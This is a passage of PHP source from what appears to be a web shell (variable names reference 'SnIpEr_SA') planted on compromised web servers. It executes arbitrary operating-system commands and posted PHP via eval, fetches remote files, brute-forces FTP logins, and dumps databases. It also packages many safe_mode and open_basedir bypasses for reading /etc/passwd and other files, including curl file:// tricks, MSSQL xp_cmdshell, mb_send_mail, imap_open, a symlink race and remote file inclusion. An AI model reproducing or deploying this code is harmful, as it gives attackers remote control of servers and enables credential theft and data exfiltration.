 $_POST['cmd'] = which('GET')." ".$_POST['rem_file']." > ".$_POST['loc_file']."";
 break;
 case curl:
 $_POST['cmd'] = which('curl')." ".$_POST['rem_file']." -o ".$_POST['loc_file']."";
 break;
 }
}
if(!empty($_POST['cmd']) && ($_POST['cmd']=="ftp_file_up" || $_POST['cmd']=="ftp_file_down"))
 {
 list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
 if(empty($ftp_port)) { $ftp_port = 21; }
 $connection = @ftp_connect ($ftp_server,$ftp_port,10);
 if(!$connection) { err(3); }
 else
  {
  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { err(4); }
  else
   {
   if($_POST['cmd']=="ftp_file_down") { if(chop($_POST['loc_file'])==$dir) { $_POST['loc_file']=$dir.((!$unix)?('\\'):('/')).basename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);        }
   if($_POST['cmd']=="ftp_file_up")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);        }
   }
  }
 @ftp_close($connection);
 $_POST['cmd'] = "";
 }

if(!empty($_POST['cmd']) && $_POST['cmd']=="ftp_brute")
 {
 list($ftp_server,$ftp_port) = split(":",$_POST['ftp_server_port']);
 if(empty($ftp_port)) { $ftp_port = 21; }
 $connection = @ftp_connect ($ftp_server,$ftp_port,10);
 if(!$connection) { err(3); $_POST['cmd'] = ""; }
 else if(!$users=get_users()) { echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc><tr><td bgcolor=#000000><font color=red face=tahoma size=-2><div align=center><b>".$lang[$language.'_text96']."</b></div></font></td></tr></table>"; $_POST['cmd'] = ""; }
 @ftp_close($connection);
 }
echo $table_up3;

if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=(!$unix)?("dir"):("ls -lia"); }
else if(empty($_POST['cmd'])&&$safe_mode){ $_POST['cmd']="safe_dir"; }
echo $font.$lang[$language.'_text1'].": <b>".$_POST['cmd']."</b></font></td></tr><tr><td><b><div align=center><textarea name=report cols=121 rows=15>";




if ($method=="file") {
                        if (@file($file)) {
                                $filer = file($file);

                                foreach ($filer as $a) { echo $a; }

                        } else {
                                echo "<script> alert(\"unable to read file: $file using: file\"); </script>";
                        }
                }
                if ($method=="fread") {
                        if (@fopen($file, 'r')) {
                                $fp = fopen($file, 'r');
                                $string = fread($fp, filesize($file));
                                echo "<pre>";
                                echo $string;
                                echo "</pre>";
                        } else {
                                echo "<script> alert(\"unable to read file: $file using: fread\"); </script>";
                        }
                }
                if ($method=="show_source") {
                        if (show_source($file)) {
                                echo "<pre>";
                                echo show_source($file);
                                echo "</pre>";
                        } else {
                                echo "<script> alert(\"unable to read file: $file using: show_source\"); </script>";
                        }

                }
                if ($method=="readfile") {
                        echo "<pre>";
                        if (readfile($file)) {
                                //echo "<pre>";
                                //echo readfile($file);
                                echo "</pre>";
                        } else {
                                echo "</pre>";
                                echo "<script> alert(\"unable to read file: $file using: readfile\"); </script>";
                        }

                }

function dozip1($link,$file)
{
   $fp = @fopen($link,"r");
   while(!feof($fp))
   {
       $cont.= fread($fp,1024);
   }
   fclose($fp);

   $fp2 = @fopen($file,"w");
   fwrite($fp2,$cont);
   fclose($fp2);
}
if (isset($_POST['funzip']))
{
dozip1($_POST['funzip'],$_POST['fzip']);
}
if(empty($_POST['root'])){
} else {
   $root = $_POST['root']; }




  $c = 0; $D = array();
  set_error_handler("eh");

  $chars = "_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

  for($i=0; $i < strlen($chars); $i++){
  $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}";

  $prevD = $D[count($D)-1];
  glob($path."*");

        if($D[count($D)-1] != $prevD){

        for($j=0; $j < strlen($chars); $j++){

           $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}";

           $prevD2 = $D[count($D)-1];
           glob($path."*");

              if($D[count($D)-1] != $prevD2){


                 for($p=0; $p < strlen($chars); $p++){

                 $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}";

                 $prevD3 = $D[count($D)-1];
                 glob($path."*");

                    if($D[count($D)-1] != $prevD3){


                       for($r=0; $r < strlen($chars); $r++){

                       $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}";
                       glob($path."*");

                       }

                    }

                 }

              }

        }

        }

  }

  $D = array_unique($D);




  foreach($D as $item)
  if(isset($_REQUEST['root']))
  echo "{$item}\n";




  function eh($errno, $errstr, $errfile, $errline){

     global $D, $c, $i;
     preg_match("/SAFE\ MODE\ Restriction\ in\ effect\..*whose\ uid\ is(.*)is\ not\ allowed\ to\ access(.*)owned by uid(.*)/", $errstr, $o);
     if($o){ $D[$c] = $o[2]; $c++;}

  }





if($safe_mode)
{
 switch($_POST['cmd'])
 {
 case 'safe_dir':
  $d=@dir($dir);
  if ($d)
   {
   while (false!==($file=$d->read()))
    {
     if ($file=="." || $file=="..") continue;
     @clearstatcache();
     list ($dev, $inode, $inodep, $nlink, $uid, $gid, $inodev, $size, $atime, $mtime, $ctime, $bsize) = stat($file);
     if(!$unix){
     echo date("d.m.Y H:i",$mtime);
     if(@is_dir($file)) echo "  <DIR> "; else printf("% 7s ",$size);
     }
     else{
     $owner = @posix_getpwuid($uid);
     $grgid = @posix_getgrgid($gid);
     echo $inode." ";
     echo perms(@fileperms($file));
     printf("% 4d % 9s % 9s %7s ",$nlink,$owner['name'],$grgid['name'],$size);
     echo date("d.m.Y H:i ",$mtime);
     }
     echo "$file\n";
    }
   $d->close();
   }
  else echo $lang[$language._text29];
 break;
    }
}
else if(($_POST['cmd']!="php_eval")&&($_POST['cmd']!="mysql_dump")&&($_POST['cmd']!="db_query")&&($_POST['cmd']!="ftp_brute")){
 $cmd_rep = ex($_POST['cmd']);
 if(!$unix) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w'))."\n"; }
 else { echo @htmlspecialchars($cmd_rep)."\n"; }}
 if($_POST['cmd'])
{
 switch($_POST['cmd'])
 {
  case 'test1':
  $ci = @curl_init("file://".$_POST['test1_file']."");
  $cf = @curl_exec($ci);
  echo $cf;
  break;
  case 'test2':
  @include($_POST['test2_file']);
  break;
  case 'mysqlb':

$mhost = "localhost";
$muser = $_POST['test3_ml'];
$mpass = $_POST['test3_mp'];
$mdb   = $_POST['test3_md'];
$file = $_POST['test3_file'];

// default mysql_read files [seperated by: ':']:
$mysql_files_str = "/etc/passwd:/proc/cpuinfo:/etc/resolv.conf:/etc/proftpd.conf";
$mysql_files = explode(':', $mysql_files_str);


                                                                $sql = array (
                                                                   "USE $mdb",

                                                                   'CREATE TEMPORARY TABLE ' . ($tbl = 'A'.time ()) . ' (a LONGBLOB)',

                                                                   "LOAD DATA LOCAL INFILE '$file' INTO TABLE $tbl FIELDS "
                                                                   . "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
                                                                   . "ESCAPED BY          '' "
                                                                   . "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",

                                                                   "SELECT a FROM $tbl LIMIT 1"
                                                                );


                                                                mysql_connect ($mhost, $muser, $mpass);

                                                                foreach ($sql as $statement) {
                                                                   $q = mysql_query ($statement);

                                                                   if ($q == false) die (
                                                                      "FAILED: " . $statement . "\n" .
                                                                      "REASON: " . mysql_error () . "\n"
                                                                   );

                                                                   if (! $r = @mysql_fetch_array ($q, MYSQL_NUM)) continue;

                                                                   echo htmlspecialchars($r[0]);
                                                                   mysql_free_result ($q);
                                                                }


echo "</textarea>";

 break;
  case 'test4':
  if(empty($_POST['test4_port'])) { $_POST['test4_port'] = "1433"; }
  $db = @mssql_connect('localhost,'.$_POST['test4_port'],$_POST['test4_ml'],$_POST['test4_mp']);
  if($db)
   {
   if(@mssql_select_db($_POST['test4_md'],$db))
    {
     @mssql_query("drop table SnIpEr_SA_temp_table",$db);
     @mssql_query("create table SnIpEr_SA_temp_table ( string VARCHAR (500) NULL)",$db);
     @mssql_query("insert into SnIpEr_SA_temp_table EXEC master.dbo.xp_cmdshell '".$_POST['test4_file']."'",$db);
     $res = mssql_query("select * from SnIpEr_SA_temp_table",$db);
     while(($row=@mssql_fetch_row($res)))
      {
      echo $row[0]."\r\n";
      }
    @mssql_query("drop table SnIpEr_SA_temp_table",$db);
    }
    else echo "[-] ERROR! Can't select database";
   @mssql_close($db);
   }
  else echo "[-] ERROR! Can't connect to MSSQL server";
  break;
  case 'test5':
  if (@file_exists('/tmp/mb_send_mail')) @unlink('/tmp/mb_send_mail');
  $extra = "-C ".$_POST['test5_file']." -X /tmp/mb_send_mail";
  @mb_send_mail(NULL, NULL, NULL, NULL, $extra);
  $lines = file ('/tmp/mb_send_mail');
  foreach ($lines as $line) { echo htmlspecialchars($line)."\r\n"; }
  break;
  case 'test6':
  $stream = @imap_open('/etc/passwd', "", "");
  $dir_list = @imap_list($stream, trim($_POST['test6_file']), "*");
  for ($i = 0; $i < count($dir_list); $i++) echo $dir_list[$i]."\r\n";
  @imap_close($stream);
  break;
  case 'test7':
  $stream = @imap_open($_POST['test7_file'], "", "");
  $str = @imap_body($stream, 1);
  echo $str;
  @imap_close($stream);
  break;
  case 'test8':
  if(@copy("compress.zlib://".$_POST['test8_file1'], $_POST['test8_file2'])) echo $lang[$language.'_text118'];
  else echo $lang[$language.'_text119'];
  break;
case 'cURL':
   if(empty($_POST['SnIpEr_SA'])){


} else {
$curl=$_POST['SnIpEr_SA'];
$ch =curl_init("file:///".$curl."\x00/../../../../../../../../../../../../".__FILE__);
curl_exec($ch);
var_dump(curl_exec($ch));
echo "</textarea></CENTER>";

}
break;
case 'copy':

if(empty($snn)){
if(empty($_GET['snn'])){
if(empty($_POST['snn'])){

} else {
$u1p=$_POST['snn'];
}
} else {
$u1p=$_GET['snn'];
}
}
  $u1p=""; // File to Include... or use _GET _POST
$tymczas=""; // Set $tymczas to dir where you have 777 like /var/tmp


$temp=tempnam($tymczas, "cx");

if(copy("compress.zlib://".$snn, $temp)){
$zrodlo = fopen($temp, "r");
$tekst = fread($zrodlo, filesize($temp));
fclose($zrodlo);
echo "".htmlspecialchars($tekst)."";
unlink($temp);
echo "</textarea></CENTER>";
}
break;
case 'ini_restore':
 if(empty($_POST['ini_restore'])){
} else {

$ini=$_POST['ini_restore'];
echo ini_get("safe_mode");
echo ini_get("open_basedir");
require_once("$ini");
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
include($_GET["ss"]);
echo "</textarea></CENTER>";
}
break;
case 'glob':
function reg_glob()
{
$chemin=$_REQUEST['glob'];
$files = glob("$chemin*");


foreach ($files as $filename) {

   echo "$filename\n";

}
}

if(isset($_REQUEST['glob']))
{
reg_glob();
}

break;
case 'zend':
 if(empty($_POST['zend'])){
} else {

$dezend=$_POST['zend'];
include($_POST['zend']);
print_r($GLOBALS);
require_once("$dezend");
echo "</textarea></p>";
}
break;
  case 'sym1':
     if(empty($_POST['sym1p'])){
             } else {
$symp=$_POST['sym1p'];
         }
     if(empty($_POST['sym1p2'])){

} else {
$symp2=$_POST['sym1p2'];

  symlink("a/a/a/a/a/a/", "dummy");
symlink("dummy".$symp2."".$symp."", "xxx");
unlink("dummy");
while (1) {
symlink(".", "dummy");

  }
 }
  break;
  case 'sym2':
  @include(xxx);
  break;

  case 'plugin':
  if ($_POST['plugin'] ){


                                           for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
                                        $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                  while (list ($key, $val) = each($ara)){
                                                    print "$val:";
                                                  }
                                                  print "\n";
                                                }
                                        }
                                 echo "</textarea>";

             }
        break;
        case 'command':
          if (!empty($_POST['command'])) {

                if ($method=="system") {
                system($_POST['command']);
                echo "Functions system";
                }
                if ($method=="passthru") {
                passthru($_POST['command']);
                echo "Functions passthru";
                }
                if ($method=="exec") {
                        $string = exec($_POST['command']);
                        echo $string;
                        echo "Functions exec";

                }
                if ($method=="shell_exec") {
                $string = shell_exec($_POST['command']);
                echo $string;
                echo "Functions shell_exec";
                }
                if ($method=="popen") {
                $pp = popen($_POST['command'], 'r');
                $read = fread($pp, 2096);
                echo $read;
                pclose($pp);
                echo "Functions popen";
                  }

	  if ($method=="proc_open") {


$command  = isset($_POST['command'])  ? $_POST['command']  : '';



/* Load the configuration. */

/* Default settings --- these settings should always be set to something. */

/* Merge settings. */

session_start();



    if (!empty($command)) {
        /* Save the command for late use in the JavaScript.  If the command is
         * already in the history, then the old entry is removed before the
         * new entry is put into the list at the front. */
        if (($i = array_search($_POST['command'], $_SESSION['history'])) !== false)
            unset($_SESSION['history'][$i]);

        array_unshift($_SESSION['history'], $_POST['command']);

        /* Now append the commmand to the output. */
        $_SESSION['output'] .= '$ ' . $_POST['command'] . "\n";

        /* Initialize the current working directory. */
        if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_POST['command'])) {
            $_SESSION['cwd'] = realpath($ini['settings']['home-directory']);
        } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_POST['command'], $regs)) {
            /* The current command is a 'cd' command which we have to handle
             * as an internal shell command. */

            if ($regs[1]{0} == '/') {
                /* Absolute path, we use it unchanged. */
                $new_dir = $regs[1];
            } else {
                /* Relative path, we append it to the current working
                 * directory. */
                $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
            }

            /* Transform '/./' into '/' */
            while (strpos($new_dir, '/./') !== false)
                $new_dir = str_replace('/./', '/', $new_dir);

            /* Transform '//' into '/' */
            while (strpos($new_dir, '//') !== false)
                $new_dir = str_replace('//', '/', $new_dir);

            /* Transform 'x/..' into '' */
            while (preg_match('|/\.\.(?!\.)|', $new_dir))
                $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);

            if ($new_dir == '') $new_dir = '/';

            /* Try to change directory. */
            if (@chdir($new_dir)) {
                $_SESSION['cwd'] = $new_dir;
            } else {
                $_SESSION['output'] .= "cd: could not change to: $new_dir\n";
            }

        } elseif (trim($_POST['command']) == 'exit') {
            logout();
        } else {

            /* The command is not an internal command, so we execute it after
             * changing the directory and save the output. */
            chdir($_SESSION['cwd']);

            // We canot use putenv() in safe mode.
            if (!ini_get('safe_mode')) {
                // Advice programs (ls for example) of the terminal size.
                putenv('ROWS=' . $rows);
                putenv('COLUMNS=' . $columns);
            }

            /* Alias expansion. */
            $length = strcspn($_POST['command'], " \t");
            $token = substr($_POST['command'], 0, $length);
            if (isset($ini['aliases'][$token]))
                $command = $ini['aliases'][$token] . substr($_POST['command'], $length);

            $io = array();
            $p = proc_open($_POST['command'],
                           array(1 => array('pipe', 'w'),
                                 2 => array('pipe', 'w')),
                           $io);

            /* Read output sent to stdout. */
            while (!feof($io[1])) {
                $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),
                                                        ENT_COMPAT, 'UTF-8');
            }
            /* Read output sent to stderr. */
            while (!feof($io[2])) {
                $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),
                                                        ENT_COMPAT, 'UTF-8');
            }

            fclose($io[1]);
            fclose($io[2]);
            proc_close($p);
        }
    }

    /* Build the command history for use in the JavaScript */
    if (empty($_SESSION['history'])) {
        $js_command_hist = '""';
    } else {
        $escaped = array_map('addslashes', $_SESSION['history']);
        $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
    }
               }
             		}


		break;
   }
}





if ($_POST['cmd']=="ftp_brute")
 {
 $suc = 0;
 foreach($users as $user)
  {
  $connection = @ftp_connect($ftp_server,$ftp_port,10);
  if(@ftp_login($connection,$user,$user)) { echo "[+] $user:$user - success\r\n"; $suc++; }
  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo "[+] $user:".strrev($user)." - success\r\n"; $suc++; } }
  @ftp_close($connection);
  }
 echo "\r\n-------------------------------------\r\n";
 $count = count($users);
 if(isset($_POST['reverse'])) { $count *= 2; }
 echo $lang[$language.'_text97'].$count."\r\n";
 echo $lang[$language.'_text98'].$suc."\r\n";
 }
if ($_POST['cmd']=="php_eval"){
 $eval = @str_replace("<?","",$_POST['php_eval']);
 $eval = @str_replace("?>","",$eval);
 @eval($eval);}

if ($_POST['cmd']=="mysql_dump")
 {
  if(isset($_POST['dif'])) { $fp = @fopen($_POST['dif_name'], "w"); }
  $sql = new my_sql();
  $sql->db   = $_POST['db'];
  $sql->host = $_POST['db_server'];
  $sql->port = $_POST['db_port'];
  $sql->user = $_POST['mysql_l'];
  $sql->pass = $_POST['mysql_p'];
  $sql->base = $_POST['mysql_db'];
  if(!$sql->connect()) { echo "[-] ERROR! Can't connect to SQL server"; }
  else if(!$sql->select_db()) { echo "[-] ERROR! Can't select database"; }
  else if(!$sql->dump($_POST['mysql_tbl'])) { echo "[-] ERROR! Can't create dump"; }
  else {
   if(empty($_POST['dif'])) { foreach($sql->dump as $v) echo $v."\r\n"; }
   else if($fp){ foreach($sql->dump as $v) @fputs($fp,$v."\r\n"); }
   else { echo "[-] ERROR! Can't write in dump file"; }
   }
 }
echo "</textarea></div>";
echo "</b>";
echo "</td></tr></table>";
echo "<table width=100% cellpadding=0 cellspacing=0>";
function div_title($title, $id)
{
  return '<a style="cursor: pointer;" onClick="change_divst(\''.$id.'\');">'.$title.'</a>';
}
function div($id)
 {
 if(isset($_COOKIE[$id]) && $_COOKIE[$id]==0) return '<div id="'.$id.'" style="display: none;">';
 return '<div id="'.$id.'">';
 }


if(!$safe_mode){
echo $fs.$table_up1.div_title($lang[$language.'_text2'],'id1').$table_up2.div('id1').$ts;
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','cmd',85,''));
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
}
else{
echo $fs.$table_up1.div_title($lang[$language.'_text28'],'id2').$table_up2.div('id2').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).in('hidden','cmd',0,'safe_dir').ws(4).in('submit','submit',0,$lang[$language.'_butt6']));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1.div_title($lang[$language.'_text208'],'id15').$table_up2.div('id15').$ts;
echo sr(15,"<b>".$lang[$language.'_text16'].$arrow."</b>","<select name=\"method\">
                            <option value=\"system\" <? if ($method==\"system\") { echo \"selected\"; } ?>system</option>
                            <option value=\"passthru\" <? if ($method==\"passthru\") { echo \"selected\"; } ?>passthru</option>
                            <option value=\"exec\" <? if ($method==\"exec\") { echo \"selected\"; } ?>exec</option>
                            <option value=\"shell_exec\" <? if ($method==\"shell_exec\") { echo \"selected\"; } ?>shell_exec</option>
                            <option value=\"popen\" <? if ($method==\"popen\") { echo \"selected\"; } ?>popen</option>
                            <option value=\"proc_open\" <? if ($method==\"proc_open\") { echo \"selected\"; } ?>proc_open</option>
                      </select>".in('hidden','dir',0,$dir).ws(2)."<b>".$lang[$language.'_text3'].$arrow."</b>".in('text','command',54,(!empty($_POST['command'])?($_POST['command']):("id"))).in('hidden','cmd',0,'command').ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;

echo $fs.$table_up1.div_title($lang[$language.'_text223'],'id5').$table_up2.div('id5').$ts;
echo sr(15,"<b>".$lang[$language.'_text16'].$arrow."</b>","<select name=\"method\">
                            <option value=\"file\" <? if ($method==\"file\") { echo \"selected\"; } ?> file</option>
                            <option value=\"fread\" <? if ($method==\"fread\") { echo \"selected\"; } ?> fread</option>
                            <option value=\"show_source\" <? if ($method==\"show_source\") { echo \"selected\"; } ?> show_source</option>
                            <option value=\"readfile\" <? if ($method==\"readfile\") { echo \"selected\"; } ?> readfile</option>
                      </select>".in('hidden','file',0,$dir).ws(2)."<b>".$lang[$language.'_text202'].$arrow."</b>".in('text','file',41,'/etc/passwd').ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text42'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"<b>".$lang[$language.'_text43'].$arrow."</b>",in('text','e_name',85,$dir).in('hidden','cmd',0,'edit_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt11']));
echo $te.'</div>'.$table_end1.$fe;

echo $fs.$table_up1.div_title($lang[$language.'_text200'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"<b>".$lang[$language.'_text202'].$arrow."</b>",in('text','snn',85,'/etc/passwd').in('hidden','cmd',0,'copy').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text300'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"<b>".$lang[$language.'_text202'].$arrow."</b>",in('text','SnIpEr_SA',85,'/etc/passwd').in('hidden','cmd',0,'cURL').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text203'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"<b>".$lang[$language.'_text202'].$arrow."</b>",in('text','ini_restore',85,'/etc/passwd').in('hidden','cmd',0,'ini_restore').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text224'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"<b>".$lang[$language.'_text202'].$arrow."</b>","<select size=\"1\" name=\"plugin\"><option value=\"plugin\">/etc/passwd</option></option></select>".in('hidden','cmd',0,'plugin').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text35'],'id12').$table_up2.div('id12').$ts;
echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3_md']):("mysql"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test3_ml',15,(!empty($_POST['test3_ml'])?($_POST['test3_ml']):("root"))).ws(4)."<b>".$lang[$language.'_text38'].$arrow."</b>".in('text','test3_mp',15,(!empty($_POST['test3_mp'])?($_POST['test3_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>");
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test3_file',96,(!empty($_POST['test3_file'])?($_POST['test3_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysqlb').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text220'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','sym1p2',50,(!empty($_POST['sym1p2'])?($_POST['sym1p']):("/../../../"))).in('text','sym1p',50,(!empty($_POST['sym1p'])?($_POST['sym1p']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'sym1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text222'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('hidden','dir',0,$dir).in('hidden','cmd',0,'sym2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;

{
echo $fs.$table_up1.div_title($lang[$language.'_text204'],'id23').$table_up2.div('id23').$ts;
echo sr(15,"<b>".$lang[$language.'_text205'].$arrow."</b>",in('text','log',96,(!empty($_POST['log'])?($_POST['log']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,' „ “—⁄ «·‘· Ê»≈„ﬂ«‰ﬂ «” Œœ«„Â filename.php?ss=http://shell.txt?').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text207'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"<b>".$lang[$language.'_text206'].$arrow."</b>",in('text','glob',85,'/etc/').in('hidden','cmd',0,'glob').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text209'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"<b>".$lang[$language.'_text206'].$arrow."</b>",in('text','root',85,'/etc/').in('hidden','cmd',0,'root').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;

echo $fs.$table_up1.div_title($lang[$language.'_text210'],'id11').$table_up2.div('id11').$ts;
echo "<table class=table1 width=100% align=center>";
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','zend',85,(!empty($_POST['zend'])?($_POST['zend']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'zend').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;

echo $table_up1.div_title($lang[$language.'_text211'],'id21').$table_up2.div('id21').$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text212']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>",in('text','php_ini1',10,'php.ini').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text213']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>",in('text','htacces',10,'htaccess').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text218']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>",in('text','file_ini',10,'ini.php').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text221'],'id15').$table_up2.div('id15').$ts;
echo sr(15,"<b>".$lang[$language.'_text16'].$arrow."</b>",in('hidden','dir',0,$dir).ws(2)."<b>".$lang[$language.'_text17'].$arrow."</b>".in('text','funzip',78,"$dir/file"));
echo sr(15,"<b>".$lang[$language.'_text65'].$arrow."</b>",in('text','fzip',105,"$dir/sploitz.zip").ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text219'],'id15').$table_up2.div('id15').$ts;
echo sr(15,"<b>".$lang[$language.'_text16'].$arrow."</b>",in('hidden','dir',0,$dir).ws(2)."<b>".$lang[$language.'_text17'].$arrow."</b>".in('text','filefrom',78,'http://website.com/file.txt'));
echo sr(15,"<b>".$lang[$language.'_text21'].$arrow."</b>",in('text','fileto',105,filename_.php).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'</div>'.$table_end1.$fe;

$aliases2 = '';
foreach ($aliases as $alias_name=>$alias_cmd)
 {
 $aliases2 .= "<option>$alias_name</option>";
 }
echo $fs.$table_up1.div_title($lang[$language.'_text7'],'id6').$table_up2.div('id6').$ts;
echo sr(15,"<b>".ws(9).$lang[$language.'_text8'].$arrow.ws(4)."</b>","<select name=alias>".$aliases2."</select>".in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;

}

if($safe_mode){
echo $fs.$table_up1.div_title($lang[$language.'_text57'],'id4').$table_up2.div('id4').$ts;
echo sr(15,"<b>".$lang[$language.'_text58'].$arrow."</b>",in('text','mk_name',54,(!empty($_POST['mk_name'])?($_POST['mk_name']):("new_name"))).ws(4)."<select name=action><option value=create>".$lang[$language.'_text65']."</option><option value=delete>".$lang[$language.'_text66']."</option></select>".ws(3)."<select name=what><option value=file>".$lang[$language.'_text59']."</option><option value=dir>".$lang[$language.'_text60']."</option></select>".in('hidden','cmd',0,'mk').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt13']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode && $unix){
echo $fs.$table_up1.div_title($lang[$language.'_text67'],'id5').$table_up2.div('id5').$ts;
echo sr(15,"<b>".$lang[$language.'_text68'].$arrow."</b>","<select name=what><option value=mod>CHMOD</option><option value=own>CHOWN</option><option value=grp>CHGRP</option></select>".ws(2)."<b>".$lang[$language.'_text69'].$arrow."</b>".ws(2).in('text','param1',40,(($_POST['param1'])?($_POST['param1']):("filename"))).ws(2)."<b>".$lang[$language.'_text70'].$arrow."</b>".ws(2).in('text','param2 title="'.$lang[$language.'_text71'].'"',26,(($_POST['param2'])?($_POST['param2']):("0777"))).in('hidden','cmd',0,'ch_').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode){

echo $fs.$table_up1.div_title($lang[$language.'_text54'],'id7').$table_up2.div('id7').$ts;
